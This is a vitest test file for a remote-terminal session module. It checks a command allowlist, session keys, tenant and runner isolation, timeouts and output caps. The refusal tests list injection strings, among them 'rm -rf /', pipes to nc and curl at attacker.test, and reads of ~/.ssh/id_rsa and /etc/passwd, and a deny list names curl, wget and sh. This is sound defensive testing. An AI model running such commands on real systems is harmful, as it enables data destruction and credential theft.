/**
 * Tests for the session machinery and the allowlist.
 *
 * The allowlist is the security boundary of this whole feature, so most of what
 * follows is an attempt to get past it. Each case names a real technique rather
 * than a random string: shell metacharacters, path traversal, argument
 * smuggling through a path where a flag was expected, and the trick of hiding
 * an extra command in the args of an allowed one. A test that only proved
 * `node --version` works would pass against `sh -c`.
 *
 * The lifecycle cases pin the three properties the brief asks for out loud —
 * time-limited, idle-timed, killable from the server — and one it does not
 * state but which is what makes the others meaningful: a session key that is
 * not enough on its own, because the caller's own org and identity are checked
 * too.
 *
 * Every function here takes `now`, so time is passed in rather than faked. A
 * timing test that leans on real clocks is a timing test that goes red on a
 * loaded CI box.
 */

import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../env.js', () => ({
  env: {
    // hashToken() is an HMAC keyed on this; a fixed value keeps digests stable.
    SESSION_SECRET: 'test-session-secret-at-least-32-characters-long',
    NODE_ENV: 'test',
    LOG_LEVEL: 'silent',
  },
  isProd: false,
}));

const {
  ALLOWED_COMMANDS,
  TERMINAL_COMMAND_TIMEOUT_MS,
  TERMINAL_IDLE_MS,
  TERMINAL_KEY_PREFIX,
  TERMINAL_MAX_COMMANDS,
  TERMINAL_MAX_OUTPUT_BYTES,
  TERMINAL_MAX_SESSION_MS,
  _resetSessions,
  appendOutput,
  claimNextCommand,
  countOpenSessions,
  describeAllowlist,
  enqueueCommand,
  findCommand,
  finishCommand,
  killSession,
  openSession,
  parseCommand,
  resolveSession,
  sessionForRunner,
  sessionIdForCommand,
  sessionsForOrg,
  subscribe,
  sweep,
} = await import('./pty.js');

type Event = { type: string; [key: string]: unknown };

const T0 = 1_700_000_000_000;

function open(over: Partial<Parameters<typeof openSession>[0]> = {}) {
  return openSession({
    orgId: 'org_1',
    runId: 'run_1',
    jobId: 'job_1',
    runnerId: 'runner_1',
    userId: 'user_1',
    now: T0,
    ...over,
  });
}

beforeEach(() => {
  _resetSessions();
});

// ─── The allowlist ───────────────────────────────────────────────────────────

describe('parseCommand — what it accepts', () => {
  it('accepts an exact allowed form and returns it as argv', () => {
    expect(parseCommand('node --version')).toEqual({ ok: true, argv: ['node', '--version'] });
    expect(parseCommand('git rev-parse HEAD')).toEqual({
      ok: true,
      argv: ['git', 'rev-parse', 'HEAD'],
    });
  });

  it('tolerates surrounding and repeated whitespace', () => {
    expect(parseCommand('   npm   ls   --depth=0  ')).toEqual({
      ok: true,
      argv: ['npm', 'ls', '--depth=0'],
    });
  });

  it('prepends OUR flags rather than taking the caller’s', () => {
    // `ls` is always -la and `head` is always bounded at 200 lines. If the
    // prefix came from the request, the bound would be the caller's to remove.
    expect(parseCommand('ls tests')).toEqual({ ok: true, argv: ['ls', '-la', 'tests'] });
    expect(parseCommand('head spec.ts')).toEqual({
      ok: true,
      argv: ['head', '-n', '200', 'spec.ts'],
    });
  });

  it('accepts a bare path command with no path at all', () => {
    expect(parseCommand('ls')).toEqual({ ok: true, argv: ['ls', '-la'] });
  });
});

describe('parseCommand — shell metacharacters', () => {
  // Each of these is a working technique against a naive `sh -c` runner. They
  // are refused on the character class, before the command name is even looked
  // up, which is why none of them depends on the allowlist being complete.
  const attempts = [
    'ls; rm -rf /',
    'ls && curl http://attacker.test',
    'ls | nc attacker.test 9000',
    'cat $(whoami)',
    'cat `id`',
    'ls > /tmp/out',
    'ls\nrm -rf .',
    'cat file & sleep 1',
    'node --version || sh',
    'cat ${HOME}/.npmrc',
    "ls 'a b'",
    'ls "a b"',
    'ls \\; sh',
    'cat file#comment',
    'ls *',
    'cat ~/.ssh/id_rsa',
    'ls !!',
  ];

  for (const attempt of attempts) {
    it(`refuses ${JSON.stringify(attempt)}`, () => {
      const parsed = parseCommand(attempt);
      expect(parsed.ok).toBe(false);
      if (!parsed.ok) expect(parsed.reason).toMatch(/not allowed|not a shell|not one of/i);
    });
  }

  it('says plainly that it is not a shell, so nobody keeps trying', () => {
    const parsed = parseCommand('ls | grep spec');
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.reason).toContain('not a shell');
  });
});

describe('parseCommand — path rules', () => {
  it('refuses an absolute path', () => {
    const parsed = parseCommand('cat /etc/passwd');
    expect(parsed).toEqual({
      ok: false,
      reason: 'Paths must be relative to the run workspace',
    });
  });

  it('refuses traversal in every position it can appear', () => {
    for (const path of ['..', '../secrets', 'a/../../b', 'nested/..', 'a/../b']) {
      const parsed = parseCommand(`cat ${path}`);
      expect(parsed.ok, path).toBe(false);
    }
  });

  it('allows a filename that merely contains dots', () => {
    // The traversal check must be about path segments, not about the substring
    // "..", or `.eslintrc..bak` and every double-dotted file is unreadable.
    expect(parseCommand('cat spec.test.ts')).toEqual({
      ok: true,
      argv: ['cat', 'spec.test.ts'],
    });
  });

  it('refuses a path that is really a flag', () => {
    // `cat -v file` is a different command. Without this rule the path slot is
    // an argument-injection slot for every binary in the list.
    const parsed = parseCommand('cat -v');
    expect(parsed).toEqual({ ok: false, reason: 'A path may not start with "-"' });
  });

  it('caps how many paths one command may take', () => {
    const parsed = parseCommand('cat a b');
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.reason).toContain('at most 1 path');
  });

  it('caps the length of a single path', () => {
    const parsed = parseCommand(`cat ${'a'.repeat(300)}`);
    expect(parsed).toEqual({ ok: false, reason: 'That path is too long' });
  });
});

describe('parseCommand — the allowlist itself', () => {
  it('refuses a command that is not on it, and names what is', () => {
    const parsed = parseCommand('bash');
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) {
      expect(parsed.reason).toContain('"bash" is not one of');
      expect(parsed.reason).toContain('node');
    }
  });

  it('refuses an allowed binary in a form that is not allowed', () => {
    // The commands are read-only by choice. A binary being on the list is not
    // permission to use its whole interface.
    for (const attempt of [
      'git push origin main',
      'git config --global user.email x@y.z',
      'npm install lodash',
      'npx playwright test',
      'node -e process.exit',
    ]) {
      expect(parseCommand(attempt).ok, attempt).toBe(false);
    }
  });

  it('refuses arguments to a no-argument command', () => {
    expect(parseCommand('pwd /etc')).toEqual({ ok: false, reason: 'pwd takes no arguments here' });
  });

  it('refuses an empty line without throwing', () => {
    expect(parseCommand('   ')).toEqual({ ok: false, reason: 'Type a command' });
  });

  it('refuses a line longer than the cap before parsing it', () => {
    const parsed = parseCommand(`cat ${'a'.repeat(1000)}`);
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.reason).toContain('at most 512 characters');
  });

  it('contains nothing that writes, fetches, or dumps the environment', () => {
    // The three exclusions argued for in pty.ts, asserted so that adding one
    // back is a deliberate act that breaks a test rather than a quiet commit.
    for (const forbidden of ['env', 'printenv', 'curl', 'wget', 'sh', 'bash', 'rm', 'mv', 'chmod']) {
      expect(ALLOWED_COMMANDS.has(forbidden), forbidden).toBe(false);
    }
  });

  it('describes every entry for the UI', () => {
    const described = describeAllowlist();
    expect(described).toHaveLength(ALLOWED_COMMANDS.size);
    for (const entry of described) {
      expect(entry.forms.length).toBeGreaterThan(0);
      expect(entry.why.length).toBeGreaterThan(0);
    }
  });
});

// ─── Sessions ────────────────────────────────────────────────────────────────

describe('opening a session', () => {
  it('mints a key that is long, prefixed, and never equal to another session’s', () => {
    const a = open();
    const b = open();
    expect(a.key.startsWith(TERMINAL_KEY_PREFIX)).toBe(true);
    // 32 random bytes, base64url — 43 characters after the prefix.
    expect(a.key.length).toBeGreaterThan(TERMINAL_KEY_PREFIX.length + 40);
    expect(a.key).not.toBe(b.key);
    expect(a.session.id).not.toBe(b.session.id);
  });

  it('never keeps the key in plaintext', () => {
    const { session, key } = open();
    expect(JSON.stringify(session)).not.toContain(key.slice(TERMINAL_KEY_PREFIX.length));
  });

  it('stamps the hard expiry from the stated limit', () => {
    const { session } = open();
    expect(session.expiresAt - session.openedAt).toBe(TERMINAL_MAX_SESSION_MS);
  });
});

describe('resolving a session', () => {
  it('accepts the right key from the right user in the right org', () => {
    const { session, key } = open();
    const lookup = resolveSession({
      sessionId: session.id,
      orgId: 'org_1',
      userId: 'user_1',
      key,
      now: T0,
    });
    expect(lookup.ok).toBe(true);
  });

  it('refuses a wrong key', () => {
    const { session } = open();
    const lookup = resolveSession({
      sessionId: session.id,
      orgId: 'org_1',
      userId: 'user_1',
      key: `${TERMINAL_KEY_PREFIX}not-the-key`,
      now: T0,
    });
    expect(lookup).toEqual({ ok: false, refusal: 'bad-key' });
  });

  it('is not reusable across orgs, even with the real key', () => {
    // The key is a capability, not an authorisation. A caller authenticated as
    // another tenant gets not-found — never a different error that would
    // confirm the session id is real.
    const { session, key } = open();
    const lookup = resolveSession({
      sessionId: session.id,
      orgId: 'org_2',
      userId: 'user_1',
      key,
      now: T0,
    });
    expect(lookup).toEqual({ ok: false, refusal: 'not-found' });
  });

  it('is not reusable by another user in the same org', () => {
    const { session, key } = open();
    const lookup = resolveSession({
      sessionId: session.id,
      orgId: 'org_1',
      userId: 'user_2',
      key,
      now: T0,
    });
    expect(lookup).toEqual({ ok: false, refusal: 'wrong-user' });
  });

  it('refuses a session id that never existed', () => {
    expect(
      resolveSession({ sessionId: 'sh_nope', orgId: 'org_1', userId: 'user_1', now: T0 }),
    ).toEqual({ ok: false, refusal: 'not-found' });
  });
});

describe('time limits', () => {
  it('closes a session at its hard limit even while it is being used', () => {
    const { session, key } = open();
    // Busy right up to the cap: activity must not extend the hard ceiling.
    for (let t = T0; t < T0 + TERMINAL_MAX_SESSION_MS; t += TERMINAL_IDLE_MS / 2) {
      const lookup = resolveSession({
        sessionId: session.id,
        orgId: 'org_1',
        userId: 'user_1',
        key,
        now: t,
      });
      expect(lookup.ok, `at +${t - T0}ms`).toBe(true);
      if (lookup.ok) enqueueCommand(lookup.session, ['pwd'], t);
      finishCommand(session, session.commands[session.commands.length - 1]!, 0, 'DONE', t);
    }

    const after = resolveSession({
      sessionId: session.id,
      orgId: 'org_1',
      userId: 'user_1',
      key,
      now: T0 + TERMINAL_MAX_SESSION_MS,
    });
    expect(after).toEqual({ ok: false, refusal: 'not-found' });
  });

  it('closes an idle session well before the hard limit', () => {
    const { session, key } = open();
    const now = T0 + TERMINAL_IDLE_MS;
    expect(now).toBeLessThan(session.expiresAt);
    const lookup = resolveSession({
      sessionId: session.id,
      orgId: 'org_1',
      userId: 'user_1',
      key,
      now,
    });
    // The sweep inside resolveSession has already removed it, so the refusal is
    // not-found rather than idle. Either way it is closed, which is the point.
    expect(lookup.ok).toBe(false);
    expect(sessionsForOrg('org_1', now)).toHaveLength(0);
  });

  it('activity postpones the idle timeout', () => {
    const { session, key } = open();
    // Ping just under the idle window, repeatedly, past where a session with no
    // activity would have died.
    let now = T0;
    for (let i = 0; i < 5; i += 1) {
      now += TERMINAL_IDLE_MS - 1_000;
      const lookup = resolveSession({
        sessionId: session.id,
        orgId: 'org_1',
        userId: 'user_1',
        key,
        now,
      });
      expect(lookup.ok, `ping ${i}`).toBe(true);
      if (lookup.ok) enqueueCommand(lookup.session, ['pwd'], now);
      finishCommand(session, session.commands[i]!, 0, 'DONE', now);
    }
    expect(now - T0).toBeGreaterThan(TERMINAL_IDLE_MS * 4);
  });

  it('abandons a command that runs past the command timeout without closing the session', () => {
    const { session } = open();
    const queued = enqueueCommand(session, ['ps', 'aux'], T0);
    expect(queued.ok).toBe(true);
    claimNextCommand(session, T0);

    sweep(T0 + TERMINAL_COMMAND_TIMEOUT_MS);
    expect(session.commands[0]!.status).toBe('ABANDONED');
    // The session survives — a hung command is not a reason to lose the
    // scrollback of everything before it.
    expect(sessionsForOrg('org_1', T0 + TERMINAL_COMMAND_TIMEOUT_MS)).toHaveLength(1);
  });
});

describe('running commands', () => {
  it('emits the command, its output and its exit to subscribers in order', () => {
    const { session } = open();
    const events: Event[] = [];
    subscribe(session, (event) => events.push(event));

    const queued = enqueueCommand(session, ['git', 'rev-parse', 'HEAD'], T0);
    expect(queued.ok).toBe(true);
    if (!queued.ok) return;

    const claimed = claimNextCommand(session, T0);
    expect(claimed?.id).toBe(queued.command.id);
    appendOutput(session, queued.command, 'stdout', 'abc123\n', T0);
    finishCommand(session, queued.command, 0, 'DONE', T0);

    expect(events.map((event) => event.type)).toEqual(['command', 'output', 'exit']);
    expect(events[1]).toMatchObject({ stream: 'stdout', chunk: 'abc123\n' });
    expect(events[2]).toMatchObject({ exitCode: 0, status: 'DONE' });
  });

  it('hands a command out exactly once, so a retried poll cannot double-execute', () => {
    const { session } = open();
    enqueueCommand(session, ['pwd'], T0);
    expect(claimNextCommand(session, T0)).not.toBeNull();
    expect(claimNextCommand(session, T0)).toBeNull();
  });

  it('refuses a second command while one is in flight', () => {
    const { session } = open();
    enqueueCommand(session, ['pwd'], T0);
    const second = enqueueCommand(session, ['uname', '-a'], T0);
    expect(second.ok).toBe(false);
    if (!second.ok) expect(second.reason).toContain('pwd');
  });

  it('allows the next command once the previous one exits', () => {
    const { session } = open();
    const first = enqueueCommand(session, ['pwd'], T0);
    if (!first.ok) throw new Error('setup');
    finishCommand(session, first.command, 0, 'DONE', T0);
    expect(enqueueCommand(session, ['uname', '-a'], T0).ok).toBe(true);
  });

  it('caps the number of commands per session', () => {
    const { session } = open();
    for (let i = 0; i < TERMINAL_MAX_COMMANDS; i += 1) {
      const queued = enqueueCommand(session, ['pwd'], T0);
      expect(queued.ok, `command ${i}`).toBe(true);
      if (queued.ok) finishCommand(session, queued.command, 0, 'DONE', T0);
    }
    const overflow = enqueueCommand(session, ['pwd'], T0);
    expect(overflow.ok).toBe(false);
    if (!overflow.ok) expect(overflow.reason).toContain(String(TERMINAL_MAX_COMMANDS));
  });

  it('ignores a second exit report for the same command', () => {
    // The agent may retry a call whose response it never saw. A second exit
    // must not re-open a finished command or emit a duplicate event.
    const { session } = open();
    const queued = enqueueCommand(session, ['pwd'], T0);
    if (!queued.ok) throw new Error('setup');
    const events: Event[] = [];
    subscribe(session, (event) => events.push(event));

    finishCommand(session, queued.command, 0, 'DONE', T0);
    finishCommand(session, queued.command, 137, 'DONE', T0);
    expect(queued.command.exitCode).toBe(0);
    expect(events.filter((event) => event.type === 'exit')).toHaveLength(1);
  });
});

describe('output limits', () => {
  it('cuts output at the cap and says it did', () => {
    const { session } = open();
    const queued = enqueueCommand(session, ['cat', 'big.log'], T0);
    if (!queued.ok) throw new Error('setup');
    const events: Event[] = [];
    subscribe(session, (event) => events.push(event));

    // Half the cap, then two-thirds of it: the second chunk crosses the line.
    appendOutput(session, queued.command, 'stdout', 'a'.repeat(TERMINAL_MAX_OUTPUT_BYTES / 2), T0);
    appendOutput(session, queued.command, 'stdout', 'b'.repeat(TERMINAL_MAX_OUTPUT_BYTES), T0);

    expect(queued.command.truncated).toBe(true);
    expect(queued.command.bytes).toBe(TERMINAL_MAX_OUTPUT_BYTES);
    expect(events.some((event) => event.type === 'truncated')).toBe(true);

    const streamed = events
      .filter((event) => event.type === 'output')
      .reduce((total, event) => total + String(event.chunk).length, 0);
    expect(streamed).toBe(TERMINAL_MAX_OUTPUT_BYTES);
  });

  it('drops further output silently once a command is truncated', () => {
    const { session } = open();
    const queued = enqueueCommand(session, ['cat', 'big.log'], T0);
    if (!queued.ok) throw new Error('setup');
    appendOutput(session, queued.command, 'stdout', 'x'.repeat(TERMINAL_MAX_OUTPUT_BYTES + 10), T0);

    const events: Event[] = [];
    subscribe(session, (event) => events.push(event));
    appendOutput(session, queued.command, 'stdout', 'more', T0);
    expect(events).toHaveLength(0);
  });

  it('cuts multi-byte output on a character boundary', () => {
    // Slicing UTF-8 by byte lands mid-codepoint and hands the client a
    // replacement character in the middle of a word.
    const { session } = open();
    const queued = enqueueCommand(session, ['cat', 'utf8.txt'], T0);
    if (!queued.ok) throw new Error('setup');
    const events: Event[] = [];
    subscribe(session, (event) => events.push(event));

    // 'é' is two bytes; an odd cap therefore has to cut one short.
    queued.command.bytes = TERMINAL_MAX_OUTPUT_BYTES - 3;
    appendOutput(session, queued.command, 'stdout', 'é'.repeat(10), T0);

    const streamed = events
      .filter((event) => event.type === 'output')
      .map((event) => String(event.chunk))
      .join('');
    expect(streamed).not.toContain('�');
    expect(streamed).toBe('é');
  });
});

describe('killing a session', () => {
  it('tells subscribers why and makes the session unresolvable', () => {
    const { session, key } = open();
    const events: Event[] = [];
    subscribe(session, (event) => events.push(event));

    expect(killSession(session.id, 'An administrator closed this session', T0)).toBe(true);
    expect(events).toEqual([
      { type: 'closed', reason: 'An administrator closed this session' },
    ]);
    expect(
      resolveSession({ sessionId: session.id, orgId: 'org_1', userId: 'user_1', key, now: T0 }),
    ).toEqual({ ok: false, refusal: 'not-found' });
  });

  it('abandons whatever was in flight rather than leaving it RUNNING forever', () => {
    const { session } = open();
    const queued = enqueueCommand(session, ['ps', 'aux'], T0);
    if (!queued.ok) throw new Error('setup');
    claimNextCommand(session, T0);
    killSession(session.id, 'stopped', T0);
    expect(queued.command.status).toBe('ABANDONED');
  });

  it('forgets the command index, so a late agent write finds nothing', () => {
    const { session } = open();
    const queued = enqueueCommand(session, ['pwd'], T0);
    if (!queued.ok) throw new Error('setup');
    expect(sessionIdForCommand(queued.command.id)).toBe(session.id);
    killSession(session.id, 'stopped', T0);
    expect(sessionIdForCommand(queued.command.id)).toBeNull();
  });

  it('is idempotent', () => {
    const { session } = open();
    expect(killSession(session.id, 'first', T0)).toBe(true);
    expect(killSession(session.id, 'second', T0)).toBe(false);
  });

  it('does not throw when a subscriber does', () => {
    // A closed HTTP response throws on write. One dead subscriber must not stop
    // the others being told the session ended.
    const { session } = open();
    const seen: Event[] = [];
    subscribe(session, () => {
      throw new Error('response already closed');
    });
    subscribe(session, (event) => seen.push(event));
    expect(() => killSession(session.id, 'stopped', T0)).not.toThrow();
    expect(seen).toHaveLength(1);
  });
});

describe('the agent’s view', () => {
  it('hands a session to the runner it was bound to', () => {
    const { session } = open();
    const lookup = sessionForRunner({
      sessionId: session.id,
      orgId: 'org_1',
      runnerId: 'runner_1',
      now: T0,
    });
    expect(lookup.ok).toBe(true);
  });

  it('refuses a different runner in the same org', () => {
    // The single most important check on the agent side: a customer with a
    // fleet must not have runner B able to read commands typed at runner A.
    const { session } = open();
    expect(
      sessionForRunner({ sessionId: session.id, orgId: 'org_1', runnerId: 'runner_2', now: T0 }),
    ).toEqual({ ok: false, refusal: 'not-found' });
  });

  it('refuses a runner from another org holding a valid token', () => {
    const { session } = open();
    expect(
      sessionForRunner({ sessionId: session.id, orgId: 'org_2', runnerId: 'runner_1', now: T0 }),
    ).toEqual({ ok: false, refusal: 'not-found' });
  });

  it('never asks the agent for a session key, because it was never given one', () => {
    const { session } = open();
    const lookup = sessionForRunner({
      sessionId: session.id,
      orgId: 'org_1',
      runnerId: 'runner_1',
      now: T0,
    });
    expect(lookup.ok).toBe(true);
    // Identity, not a bearer secret: nothing the agent sends chose this.
    if (lookup.ok) expect(lookup.session.runnerId).toBe('runner_1');
  });
});

describe('per-org accounting', () => {
  it('counts only the asking org’s sessions', () => {
    open();
    open();
    open({ orgId: 'org_2' });
    expect(countOpenSessions('org_1', T0)).toBe(2);
    expect(countOpenSessions('org_2', T0)).toBe(1);
  });

  it('never lists another org’s sessions', () => {
    open();
    open({ orgId: 'org_2', userId: 'user_9' });
    const listed = sessionsForOrg('org_1', T0);
    expect(listed).toHaveLength(1);
    expect(listed[0]!.orgId).toBe('org_1');
  });

  it('drops expired sessions out of the count without anyone asking', () => {
    open();
    expect(countOpenSessions('org_1', T0)).toBe(1);
    expect(countOpenSessions('org_1', T0 + TERMINAL_MAX_SESSION_MS)).toBe(0);
  });
});

describe('findCommand', () => {
  it('finds a command in its own session and not in another', () => {
    const a = open();
    const b = open({ userId: 'user_2' });
    const queued = enqueueCommand(a.session, ['pwd'], T0);
    if (!queued.ok) throw new Error('setup');
    expect(findCommand(a.session, queued.command.id)).toBe(queued.command);
    expect(findCommand(b.session, queued.command.id)).toBeNull();
  });
});
